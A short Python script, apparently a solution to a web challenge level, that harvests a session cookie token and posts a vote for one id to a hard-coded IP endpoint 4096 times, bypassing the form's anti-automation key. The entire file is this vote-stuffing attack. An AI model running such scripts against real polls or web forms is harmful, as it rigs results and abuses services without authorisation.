#!/usr/bin/python3
import requests
ENDPOINT = "http://158.69.76.135/level1.php"
data = {"id": "830", "holdthedoor": "Submit+Query"}
for i in range(0, 4096):
    session = requests.Session()
    session.get(ENDPOINT)
    key = session.cookies.get_dict()
    data["key"] = key['HoldTheDoor']
    session.post(url=ENDPOINT, data=data)
